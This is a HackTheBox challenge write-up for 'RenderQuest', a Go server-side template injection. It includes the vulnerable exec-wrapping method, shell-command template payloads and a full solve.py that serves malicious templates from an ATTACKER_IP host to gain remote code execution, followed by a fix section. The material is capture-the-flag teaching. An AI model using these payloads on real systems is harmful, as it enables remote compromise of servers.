---
layout: post
title: "RenderQuest"
date: 2027-06-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, go, template-injection, rce, easy]
---

## Overview

HTB Challenge: *RenderQuest* — Web, Easy.

A Go web application serves a `/render` endpoint that fetches an attacker-supplied URL and renders it as a Go `html/template`. The template data object (`RequestData`) exposes an exported method `FetchServerInfo` that runs arbitrary shell commands via `exec.Command("sh", "-c", ...)`. Because Go templates can call any exported method on the data object, an attacker-hosted template containing `{{.FetchServerInfo "cat /flag*.txt"}}` achieves remote code execution and reads the flag.

**[CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)** — Improper Neutralization of Special Elements Used in a Template Engine.

---

## The technique

Go's `html/template` package auto-escapes output to prevent XSS, but it does **not** restrict which methods on the data object a template can call. Any exported method is invocable with `{{.MethodName arg}}` syntax.

If the application passes a struct to `tmpl.Execute(w, data)` and that struct exposes a method that wraps a system-command call, an attacker who controls the template source controls what command runs on the server.

The vulnerable handler:

```go
func (p RequestData) FetchServerInfo(cmd string) string {
    out, _ := exec.Command("sh", "-c", cmd).Output()
    return string(out)
}

// In getTpl():
if remote == "true" {
    tmplFile, _ = readRemoteFile(page)   // attacker-controlled URL
}
tmpl, _ := template.New("page").Parse(tmplFile)
tmpl.Execute(w, reqData)                 // reqData exposes FetchServerInfo
```

The developer added `FetchServerInfo` to populate the page with server hostname and OS info. There is no method-call allowlist in `html/template`, so the attacker calls it with any argument.

---

## Solution

The container's `entrypoint.sh` randomizes the flag filename on startup:

```bash
mv /flag.txt /flag$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 10).txt
```

So `cat /flag.txt` fails — use a glob. The two template payloads needed:

```
{{.FetchServerInfo "ls /"}}
{{.FetchServerInfo "cat /flag*.txt"}}
```

Create `solve.py` — it spins up a local HTTP server to host the malicious templates and triggers the remote fetch:

```python
#!/usr/bin/env python3
import http.server, threading, requests, sys

TARGET      = sys.argv[1]   # http://CHALLENGE:PORT
ATTACKER_IP = sys.argv[2]   # IP reachable from the challenge container
ATTACKER_PORT = 8889

TEMPLATES = {
    "/ls.tpl":   b'{{.FetchServerInfo "ls /"}}',
    "/flag.tpl": b'{{.FetchServerInfo "cat /flag*.txt"}}',
}

class TemplateHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        body = TEMPLATES.get(self.path, b"not found")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

srv = http.server.HTTPServer(("0.0.0.0", ATTACKER_PORT), TemplateHandler)
threading.Thread(target=srv.serve_forever, daemon=True).start()

for tpl in ["/ls.tpl", "/flag.tpl"]:
    r = requests.get(f"{TARGET}/render",
        params={"page": f"http://{ATTACKER_IP}:{ATTACKER_PORT}{tpl}",
                "use_remote": "true"},
        cookies={"user_ip": "8.8.8.8"},
        timeout=15)
    print(r.text.strip())
```

Run it:

```bash
python3 solve.py http://CHALLENGE:PORT ATTACKER_IP
```

The `user_ip` cookie supplies a geocodeable IP for the freeipapi.com prerequisite check that runs before template rendering. The response to the `/flag.tpl` request prints the flag:

```
HTB{...}
```

---

## Why it worked

Go templates do not sandbox method calls on the data object. The developer passed the application's internal `RequestData` struct directly into `tmpl.Execute`, exposing every exported method as a callable template action. `FetchServerInfo` existed for a legitimate purpose (render server metadata on the page) but accepted an arbitrary `string` argument — so the attacker simply called it with a shell command instead of a predefined key.

The `html/template` package's safety guarantee covers only XSS-escaping of *output*. It offers no protection against a template *calling an exported method* that has side effects.

---

## Fix / defense

The root fix is to pass a purpose-built ViewModel to the template that exposes only pre-computed values — no methods, certainly no exec-wrapping ones:

```go
type SafeData struct{ IP, UA, Hostname, OS string }
tmpl.Execute(w, SafeData{IP: clientIP, UA: ua, Hostname: hostname, OS: osInfo})
```

Additional mitigations:
- Disallow remote template sources entirely; serve only allowlisted local template files.
- If remote templates are required, render them in a restricted subprocess with no access to the application's internal structs.
- Run the Go service as a non-root user in the container so [OS command injection](https://cwe.mitre.org/data/definitions/78.html) impact is limited.
